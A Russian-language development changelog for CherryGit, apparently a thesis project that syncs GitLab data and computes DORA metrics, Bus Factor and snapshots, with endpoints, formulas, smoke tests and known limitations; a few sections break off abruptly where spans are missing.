### 0.2. Добавлено: привязка команд к проектам через UI (раньше только REST)

Бэк-эндпоинты уже были (`PATCH /admin/projects/:uid teamUids[]`, `POST/DELETE /admin/teams/:uid/projects`), но фронт-UI не предоставлял доступа. Добавлено в **обеих** точках входа (симметрично):

- **На `/admin/projects`** — новый столбец «Команды» в таблице (chips с привязанными командами) + клик открывает диалог `ProjectTeamsDialog` с чекбоксами по всем командам → `PATCH /admin/projects/:uid {teamUids}` (полная замена набора).
- **На `/admin/teams`** — внутри раскрытой карточки команды новая секция «Проекты» с одно-кликовой привязкой/отвязкой через `POST/DELETE /admin/teams/:uid/projects`.

Обе панели взаимно инвалидируют React Query кеши.

Новые API-методы фронта: `adminProjectsApi.updateProject`, `adminTeamsApi.listTeamProjects / attachProject / detachProject`.

### 0.3. Добавлено: добавление участников из синхронизированных GitLab-данных

Раньше admin мог добавить участника **только** через ручной ввод UUID. Это требовало предварительной регистрации каждого участника **и** знания его CherryGit-uid. Реализован альтернативный поток:

- **Backend**: `GET /api/admin/teams/:uid/members/candidates` — собирает distinct GitLab-username'ы из коммитов / MR / ревью **всех проектов команды**, обогащает:
  - `mappedUser` — резолв через `user_gitlab_identities` (per-connection lookup);
  - `alreadyInTeam` — флаг наличия в `team_members`;
  - `commitsCount` / `mrsCount` / `reviewsCount` — для сортировки по активности.

  Реализация: `teams.service.listCandidatesFromGitlab`, `teams.controller.listCandidatesFromGitlab`, маршрут смонтирован **до** `/:uid/members/:memberUid` (иначе express матчит «candidates» как memberUid).

- **Frontend**: в `MembersPanel` переключатель «Вручную по UID / Из GitLab». Вкладка «Из GitLab» показывает таблицу с активностью и кнопками `+Dev` / `+Lead` для замапленных. Незамапленные показываются с пометкой «создать юзера» (отсылка к существующему flow в `/admin/users` + linkGitlabIdentity).

Новый фронт-тип `TeamGitlabCandidate` в `shared/types/index.ts`.

### 0.4. Исправлено: per-team роль участника не редактировалась через UI

Симптом: admin поднимал юзеру глобальную роль до LEAD через `/admin/users`, добавлял в команду с дефолтной per-team role = DEVELOPER, и юзер получал **403 на дашборде команды**, хотя `/me` показывал role=LEAD. Корень — две независимых роли (глобальная в JWT + per-team в `team_members.role`) by design, но UI не позволял изменить per-team role после добавления.

**Фиксы**:

- Новый API-метод `adminTeamsApi.updateMemberRole(teamUid, memberUid, role)` → `PATCH /admin/teams/:uid/members/:memberUid {role}` (бэк-эндпоинт `updateMember` уже был).
- В `MembersPanel` статичный `<Badge>` роли заменён на inline-dropdown «Разработчик / Тимлид» с мгновенным PATCH. LEAD-роль подсвечивается зелёной рамкой.
- **Smart default** в диалоге добавления участника: при выборе юзера, у которого глобальная роль = LEAD или ADMIN, per-team role в select'е автоматически ставится в LEAD (если admin не трогал select вручную).
- Подсказка под select'ом: «Это per-team роль (доступ к метрикам команды), не глобальная.»

  - CFR breakdown по типу метки (hotfix / revert).

- Новые типы `TeamLeadTimeReport`, `TeamDeploymentFrequencyReport`, `TeamChangeFailureRateReport`.
- Раскрывающийся блок с формулами (FR-11) в каждом табе.

### 1.3. Периодический инкрементальный sync (FR-02) — 🟢 80%

**Реализовано:**

- **Пайплайн** `syncProject(actorUid, projectUid)`:
  1. `fetchCommits(since=lastSyncAt, ref=defaultBranch)` → upsert `commits` через `ON CONFLICT (project_uid, sha)`
  2. `fetchMergeRequests(updated_after=lastSyncAt)` → upsert `merge_requests` с фазами Cycle Time (firstReviewAt, approvedAt, mergedAt, closedAt) и MR Size (linesAdded/Removed/filesChangedCount)
  3. Для каждого MR параллельно через `Promise.all`: `fetchMergeRequestNotes` + `fetchMergeRequestApprovals` + `fetchMergeRequestChanges` (notes переиспользуются между MR-апсёртом и `upsertReviews`, без двойного GitLab-запроса)
  4. `fetchMergeRequestCommits` → связывание через `mr_commits` (`ON CONFLICT DO NOTHING`)
  5. `fetchTags` → классификация по `releaseTagPattern` через самописный glob-матчер → upsert `deployments` через `ON CONFLICT (project_uid, tag)`
- **Маркеры hotfix/revert**: `hasHotfixLabel`/`hasRevertLabel` заполняются проверкой пересечения `MR.labels` с массивами `project.hotfixLabels`/`project.revertLabels` (доработка 1.4) — готово для CFR (2.5)
- **Мягкий лок**: `sync_statuses.status='syncing'` ставится в начале, проверка на входе → HTTP 409 при попытке параллельного запуска
- **Идемпотентность**: все `ON CONFLICT DO UPDATE`; парциальный прогресс сохраняется — при ошибке `lastSyncAt` НЕ обновляется, следующий tick повторит интервал
- **Audit**: `sync.completed` (с метриками) и `sync.failed` (с partialReport)
- **Планировщик** (`sync.scheduler.ts`): `setInterval` с защитой от перекрытия tick'ов (флаг `isRunning`), `runOnStart` опция, `stopScheduler()` для graceful shutdown
- **Конфигурация**: `SYNC_INTERVAL_M` и `SYNC_RUN_ON_START` env, default 10 минут
- **Bootstrap**: `startScheduler` вызывается после `app.listen` в `main.ts`
- **`syncAllProjects`**: graceful fail, ошибка одного проекта не останавливает обход остальных. Передаёт `actorUid=undefined` (system event) — корректно для FK на `users.uid` и nullable `auditLogs.userUid`
- **Glob-матчер** (`glob-match.ts`): поддержка `*`, `**`, `?`, `[...]` — покрывает реальные паттерны (`v*`, `release-*`, `v[0-9]*.*`)
- **Endpoint manual trigger**: `POST /admin/sync/projects/:projectUid/run` и `POST /admin/projects/:uid/resync` оба работают
- **Endpoint статуса**: `GET /admin/sync/projects/:projectUid/status` + `getProject` (projects module) возвращает syncStatus

**Осталось доработать:**

- **Маппинг GitLab user → CherryGit user для commits** (см. также 4.4):
  - GitLab `/repository/commits` НЕ возвращает username — только `author_name` и `author_email`. Сейчас в `commits.authorGitlabUsername` пишется `author_email`, `authorUid = null`.
  - Для резолва нужно расширить `user_gitlab_identities` колонкой `email` (опционально, с unique по `(connectionUid, email)`) и добавить вторую попытку резолва по email.
  - Без этого commit-метрики (Bus Factor по авторам) не привяжутся к CherryGit-юзерам, только к email-строкам.
- ~~**Связь `deployment_merge_requests` не заполняется**~~ — ✅ реализовано в доработке 1.4: `linkDeploymentsToMergeRequests` в `sync.service.ts` для каждого деплоя берёт merged MRs в окне `(prevDeploy.deployedAt, currentDeploy.deployedAt]` с `target_branch === project.defaultBranch` и вставляет в `deployment_merge_requests` (ON CONFLICT DO NOTHING). На основе связанных MR поднимаются `deployments.isHotfix`/`isRevert`.
- **Staging-таблица `gitlab_raw_payloads` не заполняется** (ВКР 2.2.5): архитектурно предусмотрен буфер «raw → processed», сейчас пайплайн парсит и пишет в нормализованные таблицы в одной фазе. Для MVP допустимо, но: (а) сложнее отлаживать расхождения с GitLab, (б) при ошибке парсера нужно повторно дёргать GitLab, а не переигрывать payload. Решение: либо реализовать staging, либо отметить в тексте ВКР «упрощённая реализация без буфера».
- **Batching для первого sync** проекта с большой историей: сейчас `fetchMergeRequests` без `since` загружает ВСЕ MR в память + 4 GitLab-запроса per MR. Для проекта с 10k MR это часы и сотни МБ RAM. Доработка: чанкование по N MR (100–200), промежуточные commit'ы в БД и `lastSyncAt`-bookmark между батчами.
- **Параллелизация по разным connections** в `syncAllProjects`: сейчас все проекты обходятся последовательно. Безопасная оптимизация — параллелить только проекты с РАЗНЫХ GitLab-инстансов (rate limit per-instance), внутри одного instance — sequential.
- **Чанкование больших `insert` batch'ей** для commits — Postgres `bind message length` падает на >65k параметров; нужно резать на батчи по ~1000 строк.
- **Очистка расшифрованного PAT-токена из памяти** после sync — сейчас живёт всё время прогона (до часов). Минор по безопасности.
- **Метрика `commitsUpserted`** считается как длина пачки, не реально вставленных — название вводит в заблуждение, можно переименовать в `commitsFetched`.
- ~~**`recalculateMetrics`** в `SyncService` всё ещё 501~~ — ✅ оживлён в доработке 2.7: делегирует в `SnapshotService.writeSnapshotsForProjectTeams` + audit `metrics.recalculated`.

### 1.4. Классификация деплоев и инцидентов (FR-03) — 🟢 90%

**Реализовано:**

- **Glob-матчер `releaseTagPattern`** (`v*`, `release-*`, `v[0-9]*.*`) — самописный `glob-match.ts`, покрывает реальные паттерны MVP; `minimatch` не подключали ради минимальных зависимостей.
- **Маппинг tag → `deployments`** в `upsertDeploymentsFromTags`: `deployedAt = tag.commit.committed_date`, `tag`, `commitSha`. Идемпотентность через `ON CONFLICT (project_uid, tag) DO UPDATE`. На каждом upsert `isHotfix/isRevert` сбрасываются в `false` (затем поднимаются линкером — корректно отрабатывает удаление меток из проекта).
- **Множественные метки инцидентов**: `projects.hotfixLabel` (text) → `hotfixLabels` (text[], default `{hotfix, rollback}`); `revertLabel` → `revertLabels` (default `{revert}`). MR классифицируется как hotfix/revert если ХОТЯ БЫ одна его метка пересекается с соответствующим массивом проекта.
- **Связь deploy ↔ MR**: `linkDeploymentsToMergeRequests(projectUid, defaultBranch)` после `upsertDeploymentsFromTags`. Для каждого деплоя берутся merged MRs с `target_branch === defaultBranch` в окне `(prevDeploy.deployedAt, currentDeploy.deployedAt]`; для первого деплоя окно открыто слева. Bulk insert в `deployment_merge_requests` (ON CONFLICT DO NOTHING) — нужно для Lead Time (2.3).
- **Классификация инцидентов на уровне деплоя**: `deployments.isHotfix`/`isRevert` поднимаются, если хотя бы один связанный MR помечен соответствующим флагом.
- **Endpoint администратора**: `PATCH /admin/projects/:uid/hotfix-labels` с DTO `{ hotfixLabels?: string[], revertLabels?: string[] }` (хотя бы одно поле обязательно, дедупликация на стороне zod). Аудит `project.incident_labels_updated` с before/after-срезом. Защита от race condition между SELECT и UPDATE (404 при удалении проекта в момент апдейта).
- **Метрика прогресса**: `SyncReport.deploymentMrLinks` показывает суммарный размер связей за прогон.

**Известные ограничения / нюансы реализации (для текста ВКР):**

- **CFR-семантика — упрощённая** (важно для защиты!). DORA-каноническая интерпретация CFR: «доля деплоев, которые СЛОМАЛИ продакшен» — отметка ставится на _broken_ deploy, если в течение ~7 дней после него выходит hotfix-MR. У нас MVP-упрощение: помечается _fix_-deploy (тот, что содержит hotfix-MR). Числитель/знаменатель отношения идентичны (1 fix = 1 broken в подавляющем большинстве случаев), но семантика атрибуции отличается. В тексте ВКР — оговорить как намеренное упрощение, чтобы не пытаться сопоставить hotfix с broken через анализ message/issue (это требует системы инцидент-менеджмента, см. CLAUDE.md «За пределами MVP»).
- **Окно первого деплоя — открытое слева**: для самого первого `deployment` в проекте окном берётся `(-∞, deployedAt]`, что цепляет ВСЕ исторические merged MR. На свежеподключённом проекте с многолетней историей это даст один деплой с тысячами привязанных MR. Lead Time для него будет аномально большим, но это «технический» первый замер — на стационарном режиме искажение не накапливается.
- **Stale-флаги после `PATCH /hotfix-labels`**: `merge_requests.hasHotfixLabel`/`hasRevertLabel` и `deployments.isHotfix`/`isRevert` НЕ пересчитываются автоматически после смены меток — `MR.labels` GitLab у нас в БД не хранится (только производные boolean'ы). Чтобы переклассифицировать историю — админ обязан вызвать `POST /admin/projects/:uid/resync`. То же касается общего `PATCH /admin/projects/:uid` с полем `hotfixLabels` в теле. Стоит отразить в onboarding-доке админа.
- **N+1 в `linkDeploymentsToMergeRequests`**: 1 SELECT deployments + N SELECT'ов merge_requests + до N UPDATE'ов. Для 100 деплоев на проект и интервала sync = 10 мин это ~15k SQL-запросов/день/проект — допустимо для MVP, но при росте до 1000+ деплоев нужно оптимизировать (обрабатывать только новые деплои + последний; либо одним запросом с window-функцией).

**Осталось доработать:**

- **Миграция БД** под смену типа колонок `hotfix_label text` → `hotfix_labels text[]` и аналогично revert — генерируется через `yarn generate`. ⚠ drizzle-kit 0.22 обычно для переименования + смены типа предлагает интерактивный prompt «is this rename?» и при подтверждении строит `DROP` + `ADD` (потеря данных). - **`environment='production'`** в `deployments` явно не пишем — в MVP теги по `releaseTagPattern` ВСЕГДА означают prod (других окружений не обрабатываем). Если потом понадобится staging/canary — добавить колонку и второй паттерн.

### 2.3. Lead Time for Changes — 🟢 90%

**Реализовано:**

- **Калькулятор** (`lead-time.calculator.ts:LeadTimeCalculator.compute`): чистая функция `(samples, deploymentsConsidered) → LeadTimeValue`, тестируемая без БД (как и 2.1/2.2).
- **Формула DORA** (ВКР FR-04): на пару `(deployment, MR)` →
  `leadTime = deployedAt − MIN(commits.committedAt for c in mr_commits)`.
- **Источник first-commit** — таблица `mr_commits` (наполняется в `sync.service.ts:linkMrCommits`), агрегат `MIN(commits.committedAt)` через GROUP BY `(deployment, MR)`.
- **Защита от data corruption**: пары с `firstCommit > deployedAt` отбрасываются (теоретически невозможно, но иначе p90 уехал бы в отрицательные значения).
- **Прозрачность расчёта** (ВКР: «формула в UI») — возвращаются три счётчика:
  - `sampleSize` — пары, попавшие в выборку;
  - `deploymentsConsidered` — всего деплоев в окне (включая без MR);
  - `excludedMrsWithoutCommits` — MR без `mr_commits` (sync не успел подгрузить детали).
    Если `sampleSize < deploymentsConsidered`, UI покажет это в раскрывающемся блоке: «у X из Y деплоев нет привязанных MR — это технические теги или ещё идёт sync».
- **Сервис** (`metrics.service.ts:getTeamLeadTime`):
  - `assertTeamAccess(actor, team)` — те же 403/404 правила;
  - параллельно через `Promise.all` два запроса: `COUNT(deployments)` в окне + JOIN-chain `deployments → deployment_merge_requests → merge_requests → mr_commits → commits` с `GROUP BY (deployment_uid, deployment.deployed_at, mr_uid)` и `MIN(committed_at)`;
  - `LEFT JOIN` на `mr_commits`/`commits` сохраняет MR без коммитов в выборке (они уходят в excludedMrsWithoutCommits), а не отбрасывает их INNER JOIN'ом — это важно для прозрачности на свежеподключённых проектах.
- **Тип возврата** `TeamLeadTimeReport`: `{ metricType, periodStart, periodEnd, teamUid, projectUids, value }` — соглашение унифицировано с 2.1/2.2 (см. ДОРАБОТКИ 9.2.15).
- **Endpoint** `GET /api/teams/:teamUid/lead-time` под `requireRole('LEAD', 'HEAD', 'ADMIN')`. **Это первая DORA-метрика, которая доступна HEAD** — в отличие от Cycle Time MR / MR Size (review-метрики, LEAD-only), Lead Time — это throughput, HEAD должен видеть её по командам своего отдела (дашборд руководителя 7.4).
- **Окно — по `deployedAt`** (стабильность исторических замеров): MR попадает в Lead Time того периода, когда он был выкатан в прод, а не когда коммитнули первую строку.
- **Smoke-проверка** (вручную):
  - пустая выборка → `medianSeconds: null`, `p90Seconds: null`, `sampleSize: 0`, `deploymentsConsidered: 0`;
  - 1 deployment с 2 MR (firstCommit=t-5d и t-3d) → 2 sample'а, медиана = среднее (5d, 3d) = 4d;
  - 1 deployment с 1 MR без `mr_commits` → `sampleSize: 0`, `excludedMrsWithoutCommits: 1`, `deploymentsConsidered: 1`.

**Известные ограничения / нюансы для текста ВКР:**

- **MR-level vs. branch-level**: каноническая DORA-формула — «first commit of branch BEFORE deploy», у нас — «first commit of MR». Различие проявляется на стратегии «squash-and-merge»: GitLab squash оставляет один commit, его `authored_date` ≠ `committed_date`. Для MVP принят MR-level — это однозначное соответствие текущей схеме (`mr_commits`) без дополнительных запросов в GitLab. В тексте ВКР отметить как намеренное упрощение.
- **Деплои без связанных MR** (`deploymentsConsidered − sampleSize/pairs`): тег поставлен вручную на коммит вне default-ветки, или окно `linkDeploymentsToMergeRequests` не захватило MR. Такие деплои не вносят вклад в Lead Time (правильно — у них нет «time-to-deploy» по MR), но видны в счётчике `deploymentsConsidered`.
- **Первый деплой проекта** (`linkDeploymentsToMergeRequests` берёт `(-∞, deployedAt]`) — притянет ВСЕ исторические merged MR, Lead Time для него аномально велик; отмечено в 1.4. На стационарном режиме искажение не накапливается.

### 2.4. Deployment Frequency — 🟢 90%

**Реализовано:**

- **Калькулятор** (`deployment-frequency.calculator.ts:DeploymentFrequencyCalculator.compute`): чистая функция `(deploys, periodStart, periodEnd, granularity) → DeploymentFrequencyValue`, без обращения к БД (контракт совпадает с 2.1-2.3).
- **Формула** (ВКР FR-04): `perDay = count / max(1, periodDays)`. Защита от деления на ноль при `periodStart=periodEnd` — `max(1, ...)`.
- **Категоризация DORA** (концепция CherryGit, согласовано с DORA Accelerate):
  | Категория | Условие | Семантика |
  | --------- | --------------- | --------------------- |
  | `elite` | `perDay > 1` | несколько в день |
  | `high` | `perDay ≥ 1/7` | день — неделя |
  | `medium` | `perDay ≥ 1/30` | неделя — месяц |
  | `low` | `perDay < 1/30` | реже (включая 0 deploys) |
  Пороги вынесены в `THRESHOLDS` (static на классе) — единое место правки.
- **`timeline`** для графика: группировка по бакетам с `granularity ∈ {day, week, month}`. Ключи бакетов:
  - `day` → `YYYY-MM-DD` (UTC);
  - `month` → `YYYY-MM`;
  - `week` → `YYYY-MM-DD` понедельника (UTC).
    Лексикографический порядок ключей совпадает с хронологическим — отсортировано через `localeCompare`. Пустые бакеты НЕ дополняются (это решает UI).
- **UTC**: все ключи бакетов считаются в UTC. `deployedAt` в БД — `timestamp without time zone` (UTC), GitLab отдаёт ISO с TZ. Использование UTC для бакетов даёт детерминированный результат независимо от TZ сервера.
- **Сервис** (`metrics.service.ts:getTeamDeploymentFrequency`):
  - `assertTeamAccess(actor, team)` — те же 403/404 правила;
  - WHERE: `inArray(projectUid, teamProjects)` + `isFailed=false` + `deployedAt ∈ [start, end]`;
  - SELECT только `deployedAt` (минимальный срез — экономит RAM на длинных периодах);
  - вызов calculator.compute с переданной granularity.
- **Семантика `isFailed=false`**: в MVP `deployments.isFailed` всегда `false` (нет интеграции с мониторингом, см. CLAUDE.md «За пределами MVP»), но фильтр оставлен в WHERE как **explicit DORA-semantic** — когда появится мониторинг, фильтр заработает «бесплатно» без правки сервиса.
- **Endpoint** `GET /api/teams/:teamUid/deployment-frequency?granularity=week|day|month` под `requireRole('LEAD', 'HEAD', 'ADMIN')` — DORA-метрика, дёргается дашбордом тимлида и руководителя (7.3/7.4). По умолчанию `granularity=week` — оптимальный масштаб для 30-90-дневного окна (день даёт слишком много баров, месяц — теряет детализацию).
- **Whitelist granularity** в контроллере: невалидное значение → HTTP 400 с пояснением, чтобы клиент сразу увидел опечатку (вместо тихого fallback на week).
- **Парная визуализация** (ВКР FR-06): DF + CFR (2.5) должны рендериться рядом. Архитектурно эндпоинты разделены — фронт делает два запроса параллельно (легче кешировать); парность сборки на фронте.
- **Smoke-проверка** (вручную):
  - 0 деплоев за 30 дней → `count=0`, `perDay=0`, `category='low'`, `timeline=[]`;
  - 5 деплоев за 7 дней (≈ 0.71/day) → `category='high'`;
  - 100 деплоев за 30 дней (≈ 3.33/day) → `category='elite'`;
  - granularity='day' c деплоями 1-2-3 мая → 3 бакета по 1 деплою;
  - granularity='week' с теми же деплоями → 1 бакет «понедельник этой недели» с 3 деплоями.

**Известные ограничения / нюансы для текста ВКР:**

- **`low` включает 0 deploys**: семантически это спорно («нет деплоев» ≠ «редко»), но в DORA-методике принято: «infrequent» категория покрывает и «zero». В UI можно дополнительно показать badge «no deploys in window» при `count=0`.
- **Граничные значения**: пороги интерпретируются `≥` — «один деплой ровно в неделю» это `high`, не `medium`. Это совпадает с интуитивной интерпретацией.
- **Неполные крайние бакеты**: если период `[Wed, Fri]` запрошен с `granularity=week` — это один week-бакет «понедельник этой недели», но он содержит данные только 3 дней. UI должен показывать неполные бакеты как есть (визуально это нормально для большинства линейных графиков).
- **Хотфиксы и реверты — тоже деплои**: в DF знаменателе считаются ВСЕ successful-деплои (включая `isHotfix=true`). Это согласовано с DORA: hotfix-деплой всё ещё деплой. CFR (2.5) использует их в числителе — но это уже отдельная метрика.

### 2.5. Change Failure Rate — 🟢 90%

**Реализовано:**

- **Калькулятор** (`change-failure-rate.calculator.ts:ChangeFailureRateCalculator.compute`): чистая функция `(deploys, granularity) → ChangeFailureRateValue`, контракт совпадает с 2.1-2.4.
- **Формула** (CherryGit MVP):
  `CFR = count(deployments с isHotfix OR isRevert) / count(all deployments) × 100%`.
  Используются уже проставленные на этапе sync флаги — данные из 1.4 (`linkDeploymentsToMergeRequests`) переиспользуются без повторного JOIN'а на MR/labels.
- **Дедупликация** `failedDeploys`: deploy с обеими метками (`isHotfix=true AND isRevert=true`) считается ОДНИМ failed (иначе ratePercent мог бы превысить 100%). При этом `breakdown.hotfixDeploys + breakdown.revertDeploys` МОЖЕТ быть больше `failedDeploys` — это «по-меточный» счётчик для прозрачности.
- **Категоризация DORA** (Accelerate 2023, упрощённые пороги CherryGit, вынесены в `THRESHOLDS`):
  | Категория | Условие |
  | --------- | -------------- |
  | `elite` | rate ≤ 15% |
  | `high` | rate ≤ 30% |
  | `medium` | rate ≤ 45% |
  | `low` | rate > 45% |
  | `null` | totalDeploys=0 (CFR не определён) |
- **`timeline`** — бакеты времени с тройкой `{total, failed, ratePercent}` в каждом. Ключи бакетов формируются ТЕМ ЖЕ `DeploymentFrequencyCalculator.bucketKey` — гарантирует совпадение временной шкалы с DF при парной визуализации (ВКР FR-06).

  1. **WHERE синхронизирован**: тот же фильтр проектов + `isFailed=false` + окно `[start, end]` — знаменатель CFR совпадает с count(DF.deploys);
  2. **`granularity` — общий query-param**: фронт дёргает оба эндпоинта с одинаковым `granularity` (`week` по умолчанию);
  3. **`bucketKey` — общая функция**: timeline'ы DF и CFR имеют идентичные ключи бакетов (UTC, понедельник для week).
- **Округление процента** — 2 знака (`roundPercent` — static на классе). Единый стиль с MR Size percent (доработка 2.2).
- **Сервис** (`metrics.service.ts:getTeamChangeFailureRate`):

  - 0 деплоев → `totalDeploys=0`, `ratePercent=0`, `category=null`, `breakdown={0,0}`, `timeline=[]`;
  - 10 деплоев, 2 hotfix → `ratePercent=20`, `category='high'`;
  - 10 деплоев, 1 hotfix+revert одновременно → `failedDeploys=1`, `breakdown={1,1}`, `ratePercent=10`;

- **MVP-семантика «fix-deploy»** (намеренное упрощение, см. 1.4): помечается _fix_-deploy (тот, который содержит hotfix-MR), а не _broken_-deploy (тот, который сломал прод и потребовал хотфикса). Числитель/знаменатель численно эквивалентны (1 fix = 1 broken в подавляющем большинстве случаев), но семантика атрибуции отличается. ### 2.6. Bus Factor — 🟢 90%

**Реализовано:**

- **Расширение схемы** `merge_requests.filePaths text[] default '{}'` ([git-data/schema.ts](back/src/db/drizzle/schema/git-data/schema.ts)) — список путей файлов MR (дедуплицированный по `new_path`). Это **основной разблокировщик** Bus Factor: до этого пути файлов нигде не сохранялись (`commits.filesChanged` всегда пустой, см. ДОРАБОТКИ 1.3 — GitLab `/repository/commits` не возвращает per-file diff).
  ⚠ Требуется миграция: `yarn generate && yarn migrate`.
- **Sync пишет filePaths** ([sync.service.ts:upsertMergeRequest](back/src/modules/sync/sync.service.ts)) — `[...new Set(changes.map(c => c.new_path))]`. Доп. GitLab-запроса нет: `fetchMergeRequestChanges` уже вызывается ради MR Size. На rename используется `new_path` (текущее расположение → актуальный модуль).
- **Util `resolveModule(filePath, modules)`** ([metrics/lib/module-resolver.ts](back/src/modules/metrics/lib/module-resolver.ts)):
  - **explicit** — первый матчинг `code_modules.pathPattern` (glob) через переиспользованный `matchGlob` из `glob-match.ts` (тот же матчер, что использует sync для releaseTagPattern — единый формат, единая логика);
  - **implicit fallback** — первая директория пути (`src/auth/foo.ts` → `auth`); файлы в корне → `<root>`.
    Это даёт **работающий Bus Factor сразу после sync, без обязательной настройки `code_modules`** — админ настраивает их, когда хочет более точную группировку.
- **Калькулятор** ([bus-factor.calculator.ts](back/src/modules/metrics/calculators/bus-factor.calculator.ts)): чистая функция `compute(mrs, modules, windowDays) → BusFactorValue`. Использует Set'ы для distinct-авторов и Map по имени модуля. Стабильная сортировка вывода по `name.localeCompare`.
- **`authorKey`** разрешает проблему незарезолвленных identity (ДОРАБОТКИ 4.4):
  - `uid:<userUid>` — если `merge_requests.authorUid` резолвится через `user_gitlab_identities`;
  - `gitlab:<authorGitlabUsername>` — fallback, чтобы distinct-count работал даже без identity.
    Это **существенно**: без fallback все unresolved авторы слипались бы в один null-bucket, искажая BF.
- **Цветовая маркировка** (CherryGit концепция): `red` (1) / `yellow` (2) / `green` (≥3). Реализована как `static colorFor(n)` для удобства тестов.
- **`overallBusFactor` = `min` по модулям с активностью**; `null` если активности нет вовсе. UI должен показывать badge «no merged MRs in window» вместо неверного «green».
- **`excludedMrsWithoutPaths`** — счётчик MR с пустым `filePaths`. Большое значение = MR засинхрены до доработки 2.6, нужен `POST /admin/projects/:uid/resync`. Это диагностика для прозрачности.
- **Сервис** ([metrics.service.ts:getTeamBusFactor](back/src/modules/metrics/metrics.service.ts)):
  - `assertTeamAccess` (403/404);
  - параллельно `Promise.all`: SELECT merged MR команды (`mergedAt ∈ [now-windowDays, now]`) + SELECT `code_modules` всех проектов команды;
  - **дедупликация модулей** по `name+pathPattern` между проектами (один логический модуль `auth` в нескольких проектах команды считается одной сущностью — удобно для монорепо);
  - вызов calculator.
- **Endpoint** `GET /api/teams/:teamUid/bus-factor?windowDays=90` ([metrics.routes.ts](back/src/modules/metrics/metrics.routes.ts)) под `requireRole('LEAD', 'HEAD', 'ADMIN')`. Whitelist `windowDays ∈ [1, 365]` → HTTP 400 на невалидное значение. Дефолт 90 (из CLAUDE.md).
- **CRUD `code_modules`** ([code-modules.service.ts](back/src/modules/projects/code-modules.service.ts)) — полностью реализован:
  - `list/create/update/delete` под `/api/admin/projects/:uid/code-modules`;
  - валидация `pathPattern` через `compileGlob` — отбрасывает невалидные glob (`src/[ab` без `]`) на этапе create/update;
  - уникальность `name` per project через PG constraint `uq_module_per_project` → HTTP 409 при дубликате;
  - audit: `code_module.created` / `updated` / `deleted` с `before/after`-срезом (удовлетворяет ВКР 2.2.3, частично закрывает 9.2.8).

**Что система ДЕЛАЕТ реально сейчас:**

- После любого sync MR имеет `filePaths`; Bus Factor работает «из коробки» с implicit-модулями (первая директория).
- Админ может опционально завести explicit-модули через REST API → группировка перестраивается без resync.
- LEAD/HEAD видят таблицу модулей с цветовой маркировкой риска и могут drill-down: список авторов (по их GitLab-username).

**Известные ограничения / нюансы для текста ВКР:**

- **`commits.filesChanged` остаётся пустым** — Bus Factor намеренно построен НЕ на commits, а на merge_requests (`filePaths`). MR — более крупная единица доставки, и её авторство резолвится надёжнее (через `username`, а не `email`). См. также ДОРАБОТКИ 1.3.
- **Squash-and-merge**: один MR с N squash-коммитами всё равно даёт N файлов из `changes`. Это корректно — Bus Factor должен считать «кто менял файл», независимо от стратегии мержа.
- **MR одного автора с большим filePaths**: один человек, заведший 100 файлов в новый модуль — это `BF(module)=1` (red). Корректно по концепции: «носитель знаний один».
- **Резолв модуля «первый match wins»**: если `code_modules.pathPattern` пересекаются (например `**/*.ts` и `src/auth/**`), порядок матчинга — как пришло в SELECT (сортировка по name ASC в `findModulesByProject`). На длительном MVP-горизонте лучше добавить `priority`-поле, но это уже расширение.
- **Implicit-модуль `<root>`**: файлы в корне (`package.json`, `Dockerfile`) попадают сюда. Это правильный сигнал — «инфра-файлы редактирует один человек» это и есть bus factor 1 на инфраструктуре.
- **Окно `windowDays` — без overlap'а с DF**: Bus Factor смотрит «сейчас минус windowDays», DF/CFR — произвольное `[periodStart, periodEnd]`. Разные семантики (стационарное здоровье команды vs. отчёт за период); в UI это два разных виджета.
- **Авторов с identity и без — нельзя смешивать**: если у автора `X` есть identity в одном MR (`uid:abc`) и нет в другом (`gitlab:x_username`), они попадут в Set как ДВА разных ключа. Это лечится либо доработкой 4.4 (auto-link при первом sync), либо ручным `linkGitlabIdentity` в admin-UI.

Используется для ручного пересчёта без обращения к GitLab — после смены `code_modules`, `hotfixLabels` и пр. (закрывает упоминание в ДОРАБОТКИ 1.3 «recalculateMetrics в SyncService всё ещё 501»).

- **Whitelist `metricType`**: запрос `?metricType=unknown` → HTTP 400 с перечислением валидных значений (`KNOWN_METRIC_TYPES` экспортируется из service).

**Что система ДЕЛАЕТ реально сейчас:**

- После каждого sync-tick (раз в 10 мин или по `POST /admin/sync/projects/:uid/run`) writer пишет snapshots для всех команд проекта — 6 метрик × N команд.
- В UI дашборд тимлида может одним запросом `GET /teams/:uid/snapshots/latest?metricType=cycle_time_mr` получить актуальный снимок (без on-demand расчёта).
- Дашборд руководителя отдела — `GET /teams/:uid/snapshots/history?metricType=deployment_frequency&from=...&to=...` рисует тренд DF по дням.
- Запрос HEAD'ом `?metricType=cycle_time_mr` → 403 (MR-level метрика приватна).

**Известные ограничения / нюансы для текста ВКР:**

- **Один snapshot per day per (метрика, команда)** — design choice, см. парадигму выше. Альтернатива (snapshot per-tick) дала бы 144 строк/день, что раздувает таблицу без пользы для UI-трендов.
- **`rolling_30d` для всех метрик кроме Bus Factor** — единое окно гарантирует, что парные метрики (DF + CFR, CT + MR Size) согласованы по выборке. Для Bus Factor — `rolling_90d` как в CLAUDE.md.
- **calculatedAt ≠ periodEnd**: `periodEnd` округлён к началу суток UTC, `calculatedAt` — реальный timestamp tick'а. UI может показывать «снепшот за {periodEnd}, рассчитан {calculatedAt}».
- **Нет TTL/cleanup**: snapshots компактные (~1-2 KB JSONB на запись), для 10 команд × 6 метрик × 1 год = ~22к строк, ~30 MB. Хранятся вечно для исторических графиков. Если когда-то понадобится retention — отдельная задача (downsampling: per-day → per-week после 90 дней).
- **Триггер snapshot — fire-and-forget**: даже если writer падает (например, OOM на gigantic teams), sync продолжается. Это намеренно: snapshot — производный артефакт, следующий tick его восстановит. В audit пишется `metrics.snapshot.failed` per-metric для диагностики.
- **HEAD-фильтрация: только MR-level метрики запрещены**. DORA (LT/DF/CFR) и Bus Factor — доступны HEAD. Это согласовано с матрицей `metrics.routes.ts` (LT/DF/CFR/BF под `LEAD,HEAD,ADMIN`; CT/MR Size под `LEAD,ADMIN`).

**Осталось доработать:**

- **Миграция БД**: `uq_snapshot_per_period` unique constraint. После `git pull` нужно `yarn generate && yarn migrate`.
- **Унификация `getTeamMetrics`** (сейчас 501) — заменить на «забрать 6 latest snapshots одним запросом». Простая обёртка через `getLatestSnapshot` по всем 6 типам параллельно. Не критично — фронт может звать 6 эндпоинтов параллельно.
- **Тренд для `getCrossTeamDora`** (`dora.service.ts` — всё ещё 501): использовать `getSnapshotHistory` по командам отдела, агрегировать DORA-метрики. Не входит в 2.7, но разблокировано.
